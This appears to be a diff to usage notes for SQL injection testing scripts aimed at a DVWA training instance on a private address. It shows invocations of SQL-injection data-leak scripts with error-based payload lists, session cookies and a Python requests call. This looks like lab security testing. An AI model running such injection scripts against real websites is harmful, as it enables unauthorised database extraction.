@@ -2,3 +2,11 @@ Running scripts:
 
 ./sqli_leak_3.sh http://10.147.38.44/DVWA/vulnerabilities/sqli/ Generic_ErrorBased_urlencoded.txt "id=X&Submit=Submit" get corrected_all_encoded.txt 4485 "PHPSESSID=a2re1ir6136hrkm1k0f3qb224t;security=low"
 
+
+Running scripts with url encoding:
+
+./run_scripts.sh "http://10.147.38.44/DVWA/vulnerabilities/sqli/" "id=X&Submit=Submit" get 4485 "PHPSESSID=173fa35jm3bbaqk7l9n8noh3hs;security=low" test_lang_po_ ./test
+
+Running python3 requests with edited cookie
+
+resp = sess.get("http://10.147.38.44/DVWA/vulnerabilities/sqli/", data=data, headers={"Cookie": "PHPSESSID=173fa35jm3bbaqk7l9n8noh3hs;security=low"})
